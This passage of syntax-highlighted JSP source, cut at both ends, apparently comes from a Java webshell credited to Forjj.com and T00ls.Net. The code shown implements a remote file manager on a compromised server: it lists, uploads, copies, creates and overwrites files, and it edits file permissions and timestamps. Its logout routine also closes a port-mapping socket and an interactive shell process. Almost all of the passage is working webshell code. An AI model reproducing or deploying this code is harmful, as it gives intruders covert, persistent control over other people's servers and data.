class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">filecount++;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt1\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt1';\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td width=\"</span><span class="number">2</span>%\<span class="string">" nowrap&gt;&lt;input type='checkbox' value='"</span>+f.getName()+<span class="string">"'/&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).down()\"&gt;"+f.getName()+"&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.formatDate(f.lastModified())+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.getSize(f.length(),<span class="comment">'B')+"&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">""</span>+f.canRead()+<span class="string">" / "</span>+f.canWrite()+<span class="string">" / "</span>+f.canExecute()+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).vEdit()\"&gt;Edit&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).down()\"&gt;Down&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).copy()\"&gt;Copy&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).move()\"&gt;Move&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).vEditProperty()\"&gt;Property&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.getName().endsWith(<span class="string">".zip"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).unpack()\"&gt;UnPack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (f.getName().endsWith(<span class="string">".rar"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:alert(<span class="comment">'Dont Support RAR,Please Use WINRAR');\"&gt;UnPack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).pack()\"&gt;Pack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt2\<span class="string">"&gt;&lt;td align=\"</span>center\<span class="string">"&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).packBatch();\<span class="string">"&gt;Pack Selected&lt;/a&gt; - &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).deleteBatch();\<span class="string">"&gt;Delete Selected&lt;/a&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td colspan=\"</span><span class="number">4</span>\<span class="string">" align=\"</span><span class="built_in">right</span>\<span class="string">"&gt;"</span>+dircount+<span class="string">" directories / "</span>+filecount+<span class="string">" files&lt;/td&gt;&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> LogoutInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).close();</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket s = (ServerSocket)obj;</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">Object online = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (online != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((OnLineProcess)online).<span class="keyword">stop</span>();</span></span><br><span class="line"><span class="vbscript">JSession.invalidate();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UploadInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">UploadBean fileBean = <span class="keyword">new</span> UploadBean();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.getWriter().println(JSession.getAttribute(CURRENT_DIR).toString());</span></span><br><span class="line"><span class="vbscript">fileBean.setSavePath(JSession.getAttribute(CURRENT_DIR).toString());</span></span><br><span class="line"><span class="vbscript">fileBean.parseRequest(<span class="built_in">request</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Upload File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> CopyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> src = <span class="built_in">request</span>.getParameter(<span class="string">"src"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">to</span> = <span class="built_in">request</span>.getParameter(<span class="string">"to"</span>);</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(src)));</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="keyword">to</span>)));</span></span><br><span class="line"><span class="vbscript">byte[] d = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(d);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">output.write(d,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(d);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Copy File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BottomInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.getWriter().println(<span class="string">"&lt;div style=\"</span>padding:<span class="number">10</span>px;border-bottom:<span class="number">1</span>px solid #fff;border-top:<span class="number">1</span>px solid #ddd;background:#eee;\<span class="string">"&gt;Copyright (C) 2009 &lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;http://www.Forjj.com/&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a target=\"</span>_blank\<span class="string">" href=\"</span>http://www.t00ls.net/\<span class="string">"&gt;[T00ls.Net]&lt;/a&gt; All Rights Reserved."</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VCreateFileInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> oldPath = path;</span></span><br><span class="line"><span class="vbscript">path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!path.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">path+=<span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">path+=oldPath;</span></span><br><span class="line"><span class="vbscript">f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript">f.createNewFile();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">f.createNewFile();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Create / Edit File &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type='hidden' name='o' value='createFile'&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current File (import new file name and new file)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>filepath\<span class="string">" id=\"</span>editfilename\<span class="string">" value=\""+path+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;File Content&lt;br /&gt;&lt;textarea class=\"</span>area\<span class="string">" id=\"</span>filecontent\<span class="string">" name=\"</span>filecontent\<span class="string">" cols=\"</span><span class="number">100</span>\<span class="string">" rows=\"</span><span class="number">25</span>\<span class="string">" &gt;&lt;/textarea&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">"  type=\"</span>button\<span class="string">" value=\"</span>Back\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VEditInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(f));</span></span><br><span class="line"><span class="vbscript">StringBuilder content = <span class="keyword">new</span> StringBuilder();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = reader.readLine();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (s != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">content.append(s+<span class="string">"\r\n"</span>);</span></span><br><span class="line"><span class="vbscript">s = reader.readLine();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">reader.close();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Create / Edit File &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type='hidden' name='o' value='createFile'&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current File (import new file name and new file)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>filepath\<span class="string">" id=\"</span>editfilename\<span class="string">" value=\""+path+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;File Content&lt;br /&gt;&lt;textarea class=\"</span>area\<span class="string">" id=\"</span>filecontent\<span class="string">" name=\"</span>filecontent\<span class="string">" cols=\"</span><span class="number">100</span>\<span class="string">" rows=\"</span><span class="number">25</span>\<span class="string">" &gt;"</span>+Util.htmlEncode(content.toString())+<span class="string">"&lt;/textarea&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">"  type=\"</span>button\<span class="string">" value=\"</span>Back\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> CreateFileInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> content = <span class="built_in">request</span>.getParameter(<span class="string">"filecontent"</span>);</span></span><br><span class="line"><span class="vbscript">BufferedWriter outs = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="keyword">new</span> File(path)));</span></span><br><span class="line"><span class="vbscript">outs.write(content,<span class="number">0</span>,content.length());</span></span><br><span class="line"><span class="vbscript">outs.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Save File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VEditPropertyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> filepath = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(filepath);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.exists())</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> read = f.canRead() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> write = f.canWrite() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">execute</span> = f.canExecute() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="vbscript">cal.setTimeInMillis(f.lastModified());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Set File Property &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current file (fullpath)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>file\<span class="string">" id=\"</span>file\<span class="string">" value=\""+request.getParameter("</span>filepath<span class="string">")+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">120</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>editProperty\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Read: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+read+<span class="string">" name=\"</span>read\<span class="string">" id=\"</span>checkbox\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  Write: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+write+<span class="string">" name=\"</span>write\<span class="string">" id=\"</span>checkbox2\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  Execute: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+<span class="keyword">execute</span>+<span class="string">" name=\"</span><span class="keyword">execute</span>\<span class="string">" id=\"</span>checkbox3\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Instead &amp;raquo;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"year:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">year</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">YEAR</span>)+<span class="string">" id=\"</span><span class="built_in">year</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">4</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"month:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">month</span>\<span class="string">" value="</span>+(cal.<span class="keyword">get</span>(Calendar.<span class="built_in">MONTH</span>)+<span class="number">1</span>)+<span class="string">" id=\"</span><span class="built_in">month</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"day:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">date</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">DATE</span>)+<span class="string">" id=\"</span><span class="built_in">date</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">""</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"hour:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">hour</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">HOUR</span>)+<span class="string">" id=\"</span><span class="built_in">hour</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"minute:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span 